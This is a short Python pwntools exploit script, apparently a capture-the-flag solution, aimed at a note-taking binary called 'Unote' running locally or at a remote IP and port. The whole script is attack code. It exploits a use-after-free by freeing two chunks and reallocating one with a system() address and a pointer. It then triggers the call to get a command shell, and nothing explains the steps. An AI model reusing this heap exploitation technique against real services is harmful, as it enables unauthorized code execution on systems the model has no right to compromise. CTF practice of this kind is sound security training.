#!/usr/bin/env python
# coding=utf-8
from pwn import *
debug=0
local=1
context.terminal=["tmux","splitw","-h"]
if local:
    a=process("./Unote")
else:
    a=remote("101.71.29.5","10014")
if debug:
    gdb.attach(a,'''
b *0x8048806
              ''')
elf=ELF("./Unote")
def menu(index):
    a.recvuntil(":")
    a.sendline(str(index))
def add(size,content):
    menu(1)
    a.recvuntil(":")
    a.sendline(str(size))
    a.recvuntil(":")
    a.send(content)

def printf(index):
    menu(3)
    a.recvuntil(":")
    a.sendline(str(index))

def delete(index):
    menu(2)
    a.recvuntil(":")
    a.sendline(str(index))

a.recvuntil(":")
a.sendline("sh\x00") #init
system_addr=0x8048672
add(100,"a") #chunk 0
add(100,"a") #chunk 1
delete(0)
delete(1)
payload=p32(system_addr)+p32(0x804A070)
add(8,payload)
printf(0)
a.interactive()

